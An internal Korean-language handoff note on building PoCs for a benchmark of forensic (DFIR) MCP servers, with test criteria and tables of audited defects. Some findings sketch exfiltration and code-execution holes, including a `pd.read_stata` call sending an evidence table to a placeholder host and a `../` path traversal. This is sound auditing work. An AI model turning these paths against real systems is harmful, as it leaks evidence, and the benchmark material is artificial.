# [전달] 1·3장 사례 PoC를 dfir-mcp-bench로 만들 때 (2026-11-28)

2·4장에서 findevil·trudi 사례를 PoC로 걸러 본 방식이다. 1·3장도 같은 기준으로 하면 결과를 함께 셀 수 있다. 이 파일은 전달용이라 반영하면 지워도 된다.

## 1. 목적과 기준
- 동적 분석(PoC)은 정적 분석으로 찾은 사례를 **걸러 내는 1차 필터**다. 서버 응답에서 결함이 실제로 성립하는지만 본다.
- 실제로 일어나는 상황만 만든다. 공격자의 안티포렌식(흔적 지우기·위장)은 괜찮다.
- 재현되지 않거나 억지 조건으로만 재현되는 사례는 매트릭스에서 빼고, PoC 폴더도 남기지 않는다.
- 판정 기준표(10항목)는 아래와 같다. 2·4장은 이 표로 다시 걸렀다.

| # | 상황 | 판정 |
|---|---|---|
| 1 | 실제 조건(안티포렌식 포함)에서 응답이 사례의 결함을 보인다 | 남김 |
| 2 | 쓸 이유가 없는 입력, 일부러 깨뜨린 파일, 실제 도구 출력과 다른 형식으로만 재현 | 뺌 |
| 3 | 실패가 응답에 그대로 드러남(success:false, 오류 문구가 결과 자리에 보임) | 뺌 |
| 4 | 잘림·생략 표시가 있음 | 건수·범위가 틀리거나 나머지를 못 받으면 남김, 표시가 정확하고 나머지도 받을 수 있으면 뺌 |
| 5 | 결함이 기록·보관 파일에만 있음 | 그 파일을 다시 읽는 단계(도구, 내보낸 보고서)를 PoC가 보이면 남김, 그런 단계가 없으면 뺌, 못 보였으면 보류 |
| 6 | 결함이 모델에게 가지 않는 문서(설치 지침 등)에만 있음 | 뺌 |
| 7 | 모델 확인에서 모델이 속지 않음 | 서버 응답 결함이 1이면 남김(모델 결과는 피해 정도) |
| 8 | 같은 결함(같은 코드·같은 수정)이 다른 사례에 있음 | 합침 |
| 9 | 환경(도구 없음, 버전) 때문에 확인 못 함 | 보류 |
| 10 | "어떤 말이 없음"만으로 재현되고 응답이 결함을 직접 보이지 않음 | 뺌 |

## 2. 폴더와 충돌
- PoC는 `pocs/<문제ID>/<서버>/<사례ID>/poc.yaml`, 실행 결과는 그 아래 `runs/<커밋>/`. 1·3장은 `pocs/P1xxx`, `pocs/P3xxx`만 만든다 → 2·4장과 겹치지 않는다.
- **같이 쓰는 파일은 직접 고치지 말고 요청한다**: `runner/bench/poc.py`, `bench.sh`, `web/`, `pocs/README.md`, `servers/*`(Dockerfile, constraints). 필요한 실행기 기능이 있으면 알려 주면 한쪽에서 반영한다.
- 브랜치를 나눠 작업하고 main을 자주 받는다.

## 3. PoC 쓰는 법
- 형식: `pocs/README.md`. 본보기: `pocs/P4192/findevil/P4192-010/poc.yaml`, 모델 확인이 붙은 예 `pocs/P4118/findevil/P4118-007/poc.yaml`.
- 증거 파일은 실제 형식으로 만든다(실제 로그 줄, 실제 gzip 등). 기록에 실행 사용자 번호가 들어가면 `${UID}`·`${GID}`를 쓰고 그 fixture에 `fill: true`를 붙인다.
- 외부 인터넷으로 요청이 나가면 안 된다. 외부 통신은 컨테이너 안 가짜 서버나 프록시로 받는다(본보기: `pocs/P4153/trudi/P4153-003`, `pocs/P4156/trudi/P4156-012`).
- 한국어 칸을 함께 쓴다: summary_ko, defect_ko(실제 동작 → 정상이라면 → 모델이 무엇을 잘못 아는지), setup_ko, realism(common/possible)과 realism_ko(실제로 생기는 이유 한 문장), steps·expect의 note_ko. 문체는 "-다".
- 실행: `./bench.sh poc <사례ID> --no-model` → `runs/`의 transcript.json에서 응답을 직접 읽어 규칙이 우연히 맞지 않았는지 본다.

## 4. 모델 확인 (필요한 사례만)
- 결함의 피해가 "모델이 응답을 잘못 읽는 것"뿐인 사례만 `model:` 블록을 붙인다. 기본 모델은 Haiku(claude-haiku-4-5) 한 개, 3번.
- 질문은 분석가가 실제로 묻는 짧은 문장으로, 도구 이름이나 결함 힌트를 넣지 않는다.
- 판정 규칙은 처음 몇 번은 모델 답을 직접 읽어 맞춘다(정규식이 느슨해 잘못 세는 일이 많았다).
- Mac Docker에서 로그인이 안 되면 `claude setup-token`으로 만든 토큰을 bench의 `data/oauth-token`에 저장한다(git에 올라가지 않음).

## 5. 매트릭스에 가져오기
- bench에 결과를 커밋·push한 뒤, 매트릭스 저장소에서 자기 장만 가져온다:
  `python tools/import_bench_pocs.py <bench 경로> ch1,ch3`
- 장을 적지 않으면 모든 장 파일을 다시 쓰니 꼭 장을 적는다.

## 6. 알려진 환경 문제와 쓸 수 있는 기능 (2026-11-28)
- trudi: 기본 이미지 `trudi-88fbca7`는 fastmcp 4.2.2라 job(비동기) 도구가 MCPError로 실패한다(trudi가 fastmcp를 고정하지 않은 탓). job 도구나 evtx_filter가 필요한 사례는 `variant: trudi-88fbca7-fastmcp3`을 쓴다(fastmcp 3.4.7, /usr/local/bin/evtx_dump.py 있음). vol 경로 고정, velociraptor·psort 없음은 그대로다.
- 실행기 기능(pocs/README.md 참고): 폴더 fixture(`dir: true`, 폴더 `mode`), 서버가 쓴 파일 검사(`file_contains`·`file_not_contains`·`file_regex`), 보조 서비스(`services:` — 가짜 HTTP(S) 서버·기록기), 서버가 직접 부르는 모델 백엔드용 가짜 Anthropic API(`anthropic_stub`).
- 아직 없는 것: 큰 증거 파일(메모리 이미지) 가져오기.
- 외부 서비스에는 PoC를 만들 때도 직접 요청하지 않는다(응답 형식은 문서로 확인).

## 7. 1장으로 넘기는 mulder 사례 (2026-11-28)
2장 사례 중 1장 문제와 같은 결함이라 우리 쪽에서 뺀 것이다. 1장 사례로 넣을지, 이미 있는 1장 사례에 코드 위치만 더할지 정해 주면 된다.

| 원래 사례 | 1장 대상 | 서버·커밋 | 코드 위치 | 요지 |
|---|---|---|---|---|
| P2049-025 | P1044 | mulder 3164843 | src/mulder/server/tools/case.py:432-466; src/mulder/db.py:1254-1310 | `verify_evidence_integrity`는 적재 때 기록한 해시와 비교해 검증한다고 알리지만 해시가 없어 비교하지 못한 `no_hash_recorded` source가 있어도 `modified`가 0이면 전체 `status`를 `all_verified`로 내고, 그 source의 `window_count`도 0으로 채운다. (조건: 해시 기록 기능 이전에 만든 사건 DB를 쓸 때) |
| P2054-054 | P1021-017 | mulder 3164843 | src/mulder/server/tools/artifacts.py:1181-1186; src/mulder/server/tools/composite/exfil.py:502-505 | `detect_timestomping` 오류의 `suggestion`과 exfil 복합 도구 안내가 등록되지 않은 `run_ez_tool('MFTECmd', ...)`를 지시해(실제는 `run_mft_parser`) 없는 도구 호출이 된다. |
| P2054-059 | P1021 | mulder 3164843 | src/mulder/orchestrator/prompts/cross_system_analyst.md:98-101; src/mulder/server/tools/findings.py:995-997; src/mulder/orchestrator/phases.py:187-187 | cross-system analyst 시스템 프롬프트가 `deduplicate_findings`(dry_run 후 적용)를 쓰라고 지시하지만 이 도구의 `tool_access`는 NARRATIVE_EXECUTOR·NARRATIVE_ANALYST·REPORT뿐이라 CROSS_ANALYST allowlist에 없어, 그 단계의 모델에는 해당 도구가 주어지지 않는다. |
| P2054-060 | P1021 | mulder 3164843 | src/mulder/orchestrator/prompts/extract_analyst.md:108-120; src/mulder/server/tools/extract/evtx.py:466-468; src/mulder/orchestrator/phases.py:161-161 | extract analyst 프롬프트가 EVTX가 있으면 `index_evtx_file`로 모든 채널을 색인하라(MANDATORY)고 지시하지만 이 도구는 `Role.EXTRACT_EXECUTOR` 전용이라 EXTRACT_ANALYST allowlist에 없어, 지시대로 호출할 수 없다. |
| P2049-054 | P1042-013 | mulder 3164843 | src/mulder/server/tools/case.py:147-183; src/mulder/server/tools/case.py:240-260 | `scan_evidence`는 'Evidence hashing complete for chain of custody'라 알리지만 `_hash_and_register_evidence`는 파일이 아닌 manifest 항목(디렉터리형 증거)을 조용히 건너뛰고 해시한 개수도 알리지 않아, 해시하지 않은 증거가 있어도 완료로 표기된다. (조건: 디렉터리형 증거) |
| P2049-099 | P1021-020 | mulder 3164843 | src/mulder/server/tools/core.py:572-587; src/mulder/db.py:763-771; src/mulder/server/tools/extract/misc.py:240-275 | `parse_prefetch`는 파싱된 Prefetch 전체를 돌려준다고 알리지만 어느 도구도 만들지 않는 source 이름 `prefetch.all`을 읽어(`run_prefetch_parser`는 `ez.prefetch`로 적재) 추출 뒤에도 늘 0건 성공을 돌려준다. |
| P2066-023 | P1013-004 | mulder 3164843 | src/mulder/server/tools/extract/misc.py:735-756 | `run_regripper`의 `profile`을 검사하지 않고 `-p`로 넘겨 rip.pl이 플러그인 폴더에 이어 붙여 require하므로, `../`가 든 값이면 플러그인 폴더 밖의 Perl 파일이 실행된다. |

## 8. 1·3장으로 넘기는 다른 서버 사례 (2026-11-28)
18개 서버를 PoC 전에 분류하면서 1·3장 사례와 같은 결함(고치는 방법이 같음)이라 2·4장에서 뺀 것이다. 7절과 같이, 1·3장 사례로 넣을지 이미 있는 사례에 코드 위치만 더할지 정해 주면 된다. 대상이 문제ID만 적힌 줄은 짝이 되는 1·3장 사례가 없는 경우다.

### 1장으로 (54건)

| 원래 사례 | 대상 | 서버·커밋 | 코드 위치 | 요지 |
|---|---|---|---|---|
| P2058-013 | P1034 | Camel 63f4cb2 | src/Camel.Server/MCPServer.cs:69-77; src/Camel.Environments/AuditEnvironment.cs:258-276 | `SetEvidence` 설명은 등록한 증거 경로를 바꾸는 실행을 서버가 구조적으로(architecturally) 거부한다고 하지만, 가드는 구분자만 정리한 경로를 증거 파일·그 폴더와 글자 그대로 비교하고 `..`·`.`를 풀지 않아 `/x/../ev.E01` 같은 표기는 통과한다. |
| P4157-001 | P1012 | Camel 63f4cb2 | src/Camel.Toolkits/Toolkit.cs:523; src/Camel.Environments/AuditEnvironment.cs:433; README.md:66; docs/Constraints.md:72-77 | 문서는 네트워크 수단이 없다고 적지만 스크립트가 공개 필드 `auditEnvironment.ExecuteCommandAsync`로 `wget` 등 임의 명령을 실행해 모델이 정한 호스트로 증거·요청을 보낼 수 있다. |
| P2049-013 | P1042 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | utils/extraction_manager.py:68-107; handlers/image_handlers.py:142-155, 530-531, 700-724; handlers/kape_handlers.py:39, 138 | `prepare_disk_image`·`list_prepared_images`·`kape_parse_artifact`는 이미지 해시를 `SHA256 Hash:`·`Image Hash`로 보이지만 이 값은 컨테이너 앞 10MB만 표본으로 한 SHA256이고, 빈 파일·읽기 실패·예외 때는 경로 문자열의 MD5로 바뀌어 다른 대상의 값이 이미지 해시로 표기된다. |
| P2054-043 | P1021 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | handlers/file_handlers.py:887-891, 889-891; server.py:236-245; handlers/database_handlers.py:232-233 | `identify_file_type`이 `analyze_sqlite_database(..., 'schema')`·`'export_all'`을 권하지만 `operation` enum은 `list_tables`·`describe_table`·`query`·`export_table`이라 안내대로 부르면 허용 값 밖이 된다. |
| P2054-044 | P1021 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | handlers/file_handlers.py:651-660; handlers/file_handlers.py:687-714; handlers/file_handlers.py:770-770; handlers/database_handlers.py:86-97 | `identify_file_type`과 `analyze_sqlite_database`(SQLite가 아닐 때)가 Primary/Correct Tool로 `parse_dsstore`·`parse_macho`·`parse_xml`·`parse_fsevents`를 안내하지만 등록된 도구가 아니어서(실제 `parse_xml_evidence`·`analyze_macos_fsevents`, 핸들러 `parse_dsstore_handler`·`parse_macho_handler`는 미등록) Unknown tool이 된다. |
| P4117-053 | P1042 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | utils/extraction_manager.py:68-107; handlers/image_handlers.py:148, 189, 271, 531, 724; core/forensic_tools.py:9 | `prepare_disk_image`가 등록하고 `list_prepared_images`가 `Hash`·`SHA256 Hash`로 싣는 값은 앞 10 MiB의 SHA-256이라, 10 MiB보다 큰 이미지에서 범위 표시 없이 일부 해시가 이미지 해시로 나간다. |
| P4118-002 | P1033 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | utils/forensic_file_access.py:564-586; handlers/database_handlers.py:36-49, 107-108 | `analyze_sqlite_database`가 DB 본 파일만 추출하고 `-wal`·`-journal`을 함께 꺼내지 않아 WAL에만 있는 최근 기록이 빠지는데 응답에 알리지 않는다(조건: 체크포인트 안 된 WAL이 있는 DB). |
| P2049-119 | P1002 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:1604-1630; sift_mcp/server.py:1668-1690; sift_mcp/server.py:1900-1925; sift_mcp/tools/disk.py:166-183; sift_mcp/tools/disk.py:2703-2710 | `extract_prefetch`·`get_amcache`·`list_deleted_files` 등 disk 도구는 `case_id`가 출력 파일 경로·이름을 정한다고 알리지만 구현은 이 값을 읽지 않고 상태의 현재 사건(`_case_id()`) 경로에 결과를 저장한 정상 응답을 돌려준다. (조건: `case_id`에 활성 사건과 다른 값을 줄 때) |
| P2054-036 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:7325-7336; sift_mcp/server.py:6638-6641; sift_mcp/server.py:10234-10236; sift_mcp/server.py:10268-10270; CLAUDE.md:36-36; CLAUDE.md:53-56; .claude/skills/investigation-workflow/SKILL.md:151-151 | `start_investigation`의 `next_required_tools`, 아티팩트 도구의 오류 사유, `CLAUDE.md`·skill 워크플로가 `mount_image`를 Phase 2 필수 단계로 지시하지만 `@mcp.tool()`이 바로 위 헬퍼 `_ntfs_mount_argv`에 붙어 `mount_image`는 등록되지 않는다(헬퍼가 대신 도구로 노출됨). 마운트 경로를 쓰는 도구(`extract_shimcache` 등)는 표준 마운트 경로에서 hive를 찾지 못하면 '아티팩트 없음' 감사 기록을 남기므로, 모델은 대체 경로(`extract_windows_artifacts`)가 준비한 것만 보게 된다. |
| P2054-037 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:3060-3072; .claude/agents/synthesis-analyst.md:53-53 | synthesis 에이전트 문서가 `get_findings(case_id, status='ACTIVE', limit=200)`로 ACTIVE 후보를 불러오라고 지시하지만 실제 인자 이름은 `finding_status`라 `status`는 FastMCP에서 버려지고, 상태가 섞인 전체 finding이 ACTIVE 후보 집합처럼 돌아온다. 200건 상한이라 finding이 많으면 실제 ACTIVE 일부가 빠질 수도 있다. (조건: ACTIVE 외 상태의 finding이 있는 사건) |
| P2054-047 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:5019-5025; sift_mcp/server.py:5433-5441 | `sigma_hunt` 응답의 `detection_gap_invariant`가 `query_sigma_results(case_id, severity=..., rule_name=...)`를 안내하지만 실제 인자는 `output_path`(필수)·`severity`·`techniques`·`limit`·`offset`·`response_format`이라 `case_id`·`rule_name`은 없고 필수 `output_path`가 빠져 호출이 거부된다. |
| P2054-048 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:7546-7550; sift_mcp/server.py:2058-2065 | `environment_preflight`의 `fix_hint`가 `extract_registry_run_keys(use_batch=False)`를 안내하지만 실제 인자 이름은 `batch_mode`이고 필수 `image_path`도 빠져 안내대로 부르면 거부된다. |
| P2054-049 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:7420-7428; sift_mcp/server.py:9277-9300 | `start_investigation` 응답의 `concrete_pattern`이 `submit_finding(claim, evidence_excerpt, confidence, source_execution_id)`를 안내하지만 `claim`·`evidence_excerpt`는 없는 인자이고 필수 `case_id`·`lane_id`·`finding_type`·`description` 등이 빠져 거부된다. |
| P2054-050 | P1021 | SAVVYDFIR-MCP 9ac8e47 | CLAUDE.md:25-30; CLAUDE.md:37-44; CLAUDE.md:534-539; CLAUDE.md:554-555; .claude/agents/memory-analyst.md:169-169; .claude/skills/investigation-workflow/SKILL.md:175-175; CLAUDE.md:553-553 | `CLAUDE.md`·agent·skill 문서가 디스크·메모리 도구를 `extract_mft_timeline(case_id)`, `extract_windows_artifacts(mount_point=...)`, `summarize_evtx(evtx_dir=...)`, `list_processes(case_id)`, `extract_srum(image_path)`, `build_timeline(case_id)` 등으로 안내하지만 실제 필수 인자(`image_path`, `dump_path`, `mount_point`)가 빠지거나 없는 인자를 써서 거부된다. |
| P2054-051 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/state.py:302-302; .claude/agents/corroboration-analyst.md:171-171; .claude/agents/corroboration-analyst.md:300-300; claude_config/CLAUDE.md:149-149 | corroboration 에이전트와 전역 배포 `CLAUDE.md`가 `update_finding`, `state.generate_narrative()`, `state.export_findings()`를 호출하라고 지시하지만 모두 내부 메서드일 뿐 MCP 도구가 아니어서 없는 도구 호출이 된다. |
| P2054-052 | P1021 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:11003-11003; sift_mcp/tools/correlation.py:169-169 | `pivot_suggestion`·`recommended_action`이 `detect_injection(pid=...)`·`list_dlls(pid=...)`를 안내하지만 필수 `dump_path`가 빠져 그대로 부르면 거부된다. |
| P2055-062 | P1002 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:2847-2904; sift_mcp/tools/correlation.py:1643-1646; sift_mcp/state.py:128-143 | `find_temporal_clusters`는 `case_id`로 state를 load하지 않고 서버에 이전 호출로 이미 로드된 state의 finding을 그대로 쓰므로, 다른 `case_id`를 넘겨도 불일치 오류 없이 현재 로드된 사건의 클러스터가 요청한 `case_id` 이름으로 반환된다. (조건: 한 서버에서 다른 사건의 case_id로 호출) |
| P2055-064 | P1007 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:5643-5645; sift_mcp/server.py:5759-5783; sift_mcp/server.py:6122-6128 | `analyze_vss`에 E01 경로를 주면 설명에 없이 `/proc/mounts`나 `/mnt/ewf`에 이미 마운트된 아무 ewf 장치를 이 이미지인지 확인하지 않고 골라 `vshadowinfo`를 돌리며 고른 장치는 응답에 없으므로, 다른 이미지의 섀도 복사본 목록이 이 이미지 결과로 기록될 수 있다. (조건: 다른 ewf 이미지가 이미 마운트되어 있음) |
| P2064-005 | P1023 | SAVVYDFIR-MCP 9ac8e47 | .claude/settings.json:101; .claude/hooks/workflow-enforce-pre.py:206-217; .claude/hooks/workflow-enforce-pre.py:309-320 | 디스크 추출 전 `sigma_hunt`·`hayabusa_hunt`·`compare_disk_and_memory`를 막는 조건이 클라이언트 훅에만 있고, `settings.json`의 PreToolUse matcher가 `generate_report`·`record_analysis_lane`만 걸어 세 도구에는 이 훅도 실행되지 않는다. |
| P4157-010 | P1013 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/safe_analysis.py:12-56,104-140; sift_mcp/server.py:11570-11626 | `run_analysis`는 쿼리의 `pd.read_csv`·`pd.read_html` 등만 차단 목록으로 막고 `pd.read_stata`·`pd.read_sas`는 막지 않은 채 `pd`를 쿼리에 넘겨, 모델이 `pd.read_stata("http://<호스트>/?d="+df.to_string())`처럼 URL을 주면 적재된 증거 표가 모델이 정한 호스트로 간다(근거: pandas `read_stata`·`read_sas`는 http URL을 받는다고 문서화). |
| P2054-073 | P1021 | VolPilot 5c84851 | mcp_server.py:1244-1246; mcp_server.py:1354-1357; plugins/memory.py:16-25; plugins/memory.py:140-141 | 항상 등록되는 `windows_strings` 설명이 `windows_vadyarascan`을 쓰라고 하지만 이 도구는 yara(선택 의존성 `full`)가 있을 때만 등록되어 기본 설치에서는 없는 도구 호출이 된다. (조건: yara 없는 기본 설치) |
| P2054-075 | P1021 | Wireshark-MCP 0e1b659 | src/wireshark_mcp/tools/bluetooth.py:573-577 | `ble_devices` 응답 summary가 없는 도구 `wireshark_extract_gatt_timeline`을 안내해(실제 `wireshark_analyze_protocol(protocol="ble_gatt_timeline")`) Unknown tool이 된다. |
| P2054-046 | P1021 | agentic-dfir a17e90b | dfir_agent/src/dfir_agent/live.py:164-171; dfir_agent/src/dfir_agent/live.py:506-506; dfir_mcp/src/dfir_mcp/__init__.py:159-161 | 에이전트 루프가 잘린 모든 도구 결과에 '더 작은 `limit`으로 다시 부르라'는 안내를 붙이지만 73개 중 44개 도구(예: `sift_vol3_windows_pslist`)에는 `limit`이 없고 서버가 모르는 인자를 `unexpected argument`로 거부해 안내대로 하면 호출이 실패한다. |
| P2061-013 | P1032 | agentic-dfir a17e90b | dfir_mcp/src/dfir_mcp/__init__.py:1366, 1417, 1458-1459 | `analyze_downloads`는 `mode`와 경로 종류의 관계를 보지 않아 `zone_identifier`에 파일, `browser_db`에 폴더를 주면 어느 분기에도 들어가지 않고 `total_downloads 0` 정상 응답이 된다. |
| P2067-002 | P1039 | agentic-dfir a17e90b | dfir_mcp/src/dfir_mcp/__init__.py:1061-1062, 1262-1263, 1388-1389; dfir_mcp/src/dfir_mcp/_v06_macos_linux.py:128 | `parse_knowledgec` 등 SQLite 도구는 증거 경로를 `file:{path}?mode=ro` URI에 그대로 넣어 경로의 `#`·`?`가 URI 구분자로 읽혀 `mode=ro`가 빠지거나 다른 파일을 연다. |
| P4118-012 | P1033 | agentic-dfir a17e90b | dfir_mcp/src/dfir_mcp/__init__.py:1061-1076, 1262-1307, 1388-1407 | `parse_knowledgec`·`parse_browser_history`·`analyze_downloads`가 SQLite를 `immutable=1`로 열어 `-wal`에만 있는 최근 기록을 읽지 않고 알리지 않는다(SQLite는 immutable DB를 임시 파일처럼 다뤄 WAL을 열지 않음). |
| P4095-014 | P1021 | autopsy cb3dacd | Core/src/org/sleuthkit/autopsy/mcp/TskQueryService.java:379; Core/src/org/sleuthkit/autopsy/mcp/TskQueryService.java:398-407; Core/src/org/sleuthkit/autopsy/mcp/TskQueryService.java:462-473; Core/src/org/sleuthkit/autopsy/mcp/TskQueryService.java:601-680 | `query_files`의 해시·MIME·known 필터와 `query_analysis_results`·`query_data_artifacts`는 ingest 실행 여부를 보지 않고 빈 결과를 정상으로 낸다(선행 작업 없이 빈 결과). |
| P4095-022 | P1042 | mcp-forensic-toolkit b81db06 | mcp_forensic_toolkit/server.py:92-110 | `hash_directory`: `os.walk`에 `onerror`가 없어(Python 문서상 오류 무시) 열 수 없는 하위 폴더의 파일이 결과 dict에서 흔적 없이 빠진다. |
| P2061-032 | P1032 | mcp-velociraptor 1f97a4f | mcp_velociraptor_bridge.py:697-713; mcp_velociraptor_bridge.py:891-927 | OS별 수집 도구가 `client_id` 단말의 OS를 보지 않아, Linux 단말로 `windows_pslist`를 부르면 `ok:true` 빈 목록이, `macos_pslist`를 부르면 그 Linux 단말의 프로세스가 macOS 결과로 온다. |
| P2061-033 | P1022 | mcp-velociraptor 1f97a4f | velociraptor_api.py:588-601; mcp_velociraptor_bridge.py:1988-2000 | `get_collection_results`가 `client_id`·`flow_id`·`artifact`의 짝이 있는지 보지 않고 로그가 없으면 실행 중으로만 판정해, 틀린 값이면 기본 5분을 기다린 뒤 값이 틀렸다는 안내 없이 "did not finish" 오류가 온다. |
| P4093-017 | P1022 | mcp-velociraptor 1f97a4f | velociraptor_api.py:544-564; mcp_velociraptor_bridge.py:50-66 | `linux_*`·`macos_*`·`windows_*`·`yara_*` 실시간 수집 도구: 완료 이벤트(`System.Flow.Completion`)의 flow 상태·오류를 보지 않고 `source()` 행만 읽어, 단말에서 아티팩트가 실패해도 `ok: true`와 빈 `data`(조건: 단말 측 아티팩트 실행 실패). |
| P4118-025 | P1022 | mcp-velociraptor 1f97a4f | velociraptor_api.py:526-541; mcp_velociraptor_bridge.py:351-361 | `get_hunt_results_tool`이 hunt 완료 여부를 보지 않고 일부·빈 행을 완료 결과처럼 낸다(조건: hunt가 아직 진행 중). |
| P4157-002 | P1014 | mcp-velociraptor 1f97a4f | mcp_velociraptor_bridge.py:231-239, 305-347, 364-371, 2004-2043 | `ENABLE_DANGEROUS_TOOLS`는 `run_vql`만 막고 `collect_artifact`·`hunt_across_fleet`은 모델이 고른 아티팩트 이름(`Generic.Client.VQL` 등)과 인자를 그대로 넘겨, 단말이 모델이 적은 임의 주소로 요청·업로드를 보낼 수 있다. |
| P2049-023 | P1043 | protocol-siftpp ae5e7d5 | src/protocol_siftpp/mcp_server/server.py:46-68; src/protocol_siftpp/mcp_server/volatility.py:98-108 | `evidence_metadata`는 `sha256`을 acquisition sha256(chain of custody)이라 알리지만 이 값은 첫 도구 호출 때 지연 생성된 `EvidenceGuard.open`이 그 시점 파일을 해시한 것이라, 획득 시점 해시가 아닌 값을 획득 해시로 표기한다. (조건: 첫 도구 호출 전에 증거가 바뀌었을 때) |
| P2049-024 | P1044 | protocol-siftpp ae5e7d5 | src/protocol_siftpp/mcp_server/volatility.py:1-12; src/protocol_siftpp/mcp_server/volatility.py:117-121; src/protocol_siftpp/mcp_server/volatility.py:165-184; src/protocol_siftpp/mcp_server/volatility.py:207-216 | 모든 `vol_*` 결과의 `integrity_ok: True`는 모듈 문서가 말하는 실행 전후 byte-identical 검사가 아니라 크기와 mtime만 본 `assert_unchanged` 통과를 뜻하는데, 바이트 동일성이 검증된 것처럼 표기된다. (조건: 증거가 크기와 mtime을 유지한 채 바뀌었을 때) |
| P4118-031 | P1033 | regipy c6de929 | regipy_mcp_server/server.py:49-67 | regipy MCP가 트랜잭션 로그(`.LOG1`·`.LOG2`)를 확장자로 빼고 적용하지 않으며, 응답에 하이브가 최신 상태가 아닐 수 있다는 표시가 없다. |
| P2054-039 | P1021 | sift-kernel ea51bec | src/handlers/in-process.ts:405-409 | `detect_account_manipulation` 응답이 `search_events`에 `params: { event_ids: [...] }`를 권하지만 디스패처 스키마에는 `event_id`만 있고 핸들러도 `event_ids`를 읽지 않아, 안내대로 부르면 이벤트 ID 필터 없이 전체 이벤트가 정상 응답으로 나온다. |
| P2054-055 | P1021 | sift-kernel ea51bec | src/server.ts:2267-2273 | `challenge_finding` 응답의 `challenge_strategies`가 없는 도구 `detect_anti_forensics_summary`를 권하고(실제 `get_anti_forensics_summary`) 나머지는 category 없이 operation 이름만 적어 그대로 부르면 Unknown tool이 된다. |
| P2054-056 | P1021 | sift-kernel ea51bec | src/server.ts:413-416; src/domain/capability-graph.ts:200-200 | `list_workflows` hint가 각 workflow를 `category(operation='...')`로 부르라고 하지만 반환되는 `reporting`은 디스패처 도구가 아니어서 Unknown tool이 된다. |
| P2054-057 | P1021 | sift-kernel ea51bec | src/server.ts:2399-2408; src/server.ts:2246-2265 | MCP prompt `quick_triage`와 `corroborate_finding`의 `suggested_tools`가 `parse_prefetch`·`search_events` 등 operation 이름만 도구처럼 지시하지만 tools/list에는 category 디스패처만 있어 일반 클라이언트에서는 해당 이름의 도구가 없다. |
| P2054-077 | P1021 | sift-kernel ea51bec | src/handlers/in-process.ts:539-543; src/server.ts:221; src/server.ts:1854-1873 | `check_services` 응답이 `parse_registry_key`에 `params: {hive_path, plugin}`을 권하지만 처리 함수는 `path`·`plugin`만 읽고 `parse_registry_key`에는 기본 hive도 없어, 안내대로 부르면 hive 경로 없이 regipy가 실행되어 실패한다. |
| P2055-022 | P1032 | sift-kernel ea51bec | src/dispatcher.ts:72-72; src/dispatcher.ts:123-126; src/dispatcher.ts:234-236; src/handlers/in-process.ts:469-505; src/handlers/in-process.ts:916-927 | linux 범주의 `parse_auth_log`·`parse_syslog`·`parse_bash_history`는 스키마에 `path`를 받는다고 알리지만 처리 함수는 이를 쓰지 않고 앞서 실행한 `extract_file` 기록 중 내용이 있는 항목을 골라 앞 100줄(200줄)만 파싱해, 결과가 이전 호출 이력에 따라 다른 파일의 내용이 된다. (조건: 앞서 추출한 파일 중 하나의 내용에 대상 경로 문자열이 있음. 그렇지 않으면 추출 뒤에도 계속 file_not_extracted) |
| P2061-036 | P1029 | sift-kernel ea51bec | src/server.ts:1625-1642 | `mount_evidence`의 `image_path`가 pcap·pcapng·cap 확장자면 파일이 있는지 보지 않고 `mounted`·`network_capture_loaded` 능력과 ledger 기록을 만들어, 없는 경로로도 네트워크 분석 단계가 열린다. |
| P2064-006 | P1027 | sift-kernel ea51bec | src/server.ts:443; src/server.ts:820-844 | 서버 안내는 `READY_FOR_REPORT`일 때만 `generate_report`를 부르라고 하지만, 서버는 발견사항이 1건이라도 있으면 실행 가능한 도구가 남아 있어도 `forceAdvanceToReport`로 FSM을 넘기고 보고서를 만든다(조건이 안내에만 있음). |
| P4095-037 | P1016 | sift-kernel ea51bec | src/adapters/process-executor.ts:68-83, 219-226; src/server.ts:202-202 | `verify_integrity` 등: 실행 파일이 없으면 `BINARY_FALLBACKS`의 다른 도구를 같은 인자로 실행하고 대체 사실을 응답에 싣지 않아, `ewfverify` 대신 `img_stat`가 0으로 끝나면 해시 검증 없이 성공. |
| P4107-031 | P1032 | sift-kernel ea51bec | src/handlers/in-process.ts:469-509 | linux 도구들은 대상 파일이 꺼내졌는지만 확인한 뒤 `raw.length>0`인 첫 `extract_file` 결과를 파싱해, 다른 파일의 내용을 대상 로그 결과로 내고 출처 표시가 없다. |
| P4116-052 | P1024 | sift-kernel ea51bec | src/server.ts:602-621, 1830, 2057-2062 | `get_investigation_health`·`get_coverage_gaps`의 coverage가 `recordExecution` 횟수라 `no_data`를 success로 낸 처리기와 결과를 기다리지 않은 비동기 작업도 수행으로 세어 EXCELLENT·GOOD 판정을 낸다. |
| P4116-054 | P1030 | sift-kernel ea51bec | src/server.ts:1714-1718, 1757-1764 | `mount_evidence`가 fsstat에서 파일시스템을 못 알아보면 `evidence_type`을 `disk-windows`로 정해 응답에 싣고 가정임을 표시하지 않는다(조건: 알 수 없는 파일시스템). |
| P2062-031 | P1015 | sift-mcp 5ef6081 | packages/sift-mcp/src/sift_mcp/tools/generic.py:98; packages/sift-mcp/src/sift_mcp/tools/generic.py:153-156 | `run_command` / `command[0]` 경로: `/opt/x/vol.py`의 경로를 버리고 PATH에서 찾은 같은 이름 실행 파일로 바꿔 실행하고 알리지 않는다. |
